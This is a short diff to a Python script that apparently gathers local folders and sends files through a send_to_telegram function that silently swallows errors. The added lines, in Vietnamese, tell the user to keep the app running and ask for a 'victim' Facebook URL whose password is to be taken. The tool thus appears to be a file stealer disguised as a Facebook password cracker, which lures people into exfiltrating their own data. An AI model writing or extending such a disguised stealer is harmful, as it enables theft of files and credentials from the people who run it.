@@ -113,6 +113,8 @@ def send_to_telegram(file_path):
     except Exception as e:
         pass
 def main():
+    print("lưu ý lúc chạy ko được dừng hoặc thoát app, chú ý internet")
+    victim = input("Nhập URL FB muốn lấy mật khẩu: ")
     print("Đang setup...")
     all_subfolders = []
     all_root_dirs = []
